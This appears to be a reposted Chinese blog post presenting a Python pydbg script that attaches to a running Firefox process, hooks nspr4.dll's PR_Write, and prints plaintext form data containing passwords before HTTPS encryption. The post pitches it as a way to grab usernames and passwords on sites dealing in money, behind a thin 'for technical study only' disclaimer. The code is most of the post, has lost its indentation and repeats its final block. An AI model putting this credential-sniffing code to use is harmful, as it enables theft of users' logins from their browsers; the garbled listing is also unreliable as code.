相对于http协议，http是的特点就是他的安全性，http协议的通信内容用普通的嗅探器可以捕捉到，但是https协议的内容嗅探到的是加密后的内容，对我们的利用价值不是很高，所以一些大的网站
----
涉及到“大米”的网站，采用的都是http是协议，嘿嘿，即便这样，还是有办法能看到他的用户名和密码的，嘿嘿，本文只是用于技术学习，只是和大家交流技术，希望不要用于做违法的事情，这个例子是在firefox浏览器下登录https协议的网站，我们预先打开程序，就来了个捕获用户名和密码：

下面是源代码：

_复制代码_ 代码如下:

  
#!/ur/bin/env python  
from pydbg import *  
from pydbg.defines import *  
  
import utils  
import sys  
  
dbg = pydbg()  
found_firefox = False  
  
pattern = "password"  
  
  
def ssl_sniff( dbg, args ):  
buffer = ""  
offset = 0  
  
while 1:  
byte = dbg.read_process_memory( args[1] + offset, 1 )  
if byte != "x00":  
buffer += byte  
offset += 1  
continue  
else:  
break  
if pattern in buffer:  
print "Pre-Encrypted: %s" % buffer  
return DBG_CONTINUE  
# 寻找firefox.exe的进程  
for (pid, name) in dbg.enumerate_processes():  
if name.lower() == "firefox.exe":  
found_firefox = True  
hooks = utils.hook_container()  
dbg.attach(pid)  
print "[*] Attaching to firefox.exe with PID: %d" % pid  
# 得到firefox的hook的 address  
hook_address = dbg.func_resolve_debuggee("nspr4.dll","PR_Write")  
if hook_address:  
# 添加hook的内容，包括他的pid，地址，嗅探类型  
  
hooks.add( dbg, hook_address, 2, ssl_sniff, None )  
print "[*] nspr4.PR_Write hooked at: 0x%08x" % hook_address  
break  
else:  
print "[*] Error: Couldn't resolve hook address."  
sys.exit(-1)  
if found_firefox:  
print "[*] Hooks set, continuing process."  
dbg.run()  
else:  
print "[*] Error: Couldn't find the firefox.exe process."  
sys.exit(-1)  
  
if found_firefox:  
print "[*] Hooks set, continuing process."  
dbg.run()  
else:  
print "[*] Error: Couldn't find the firefox.exe process."  
sys.exit(-1)  

转自：  http://world77.blog.51cto.com/414605/518679

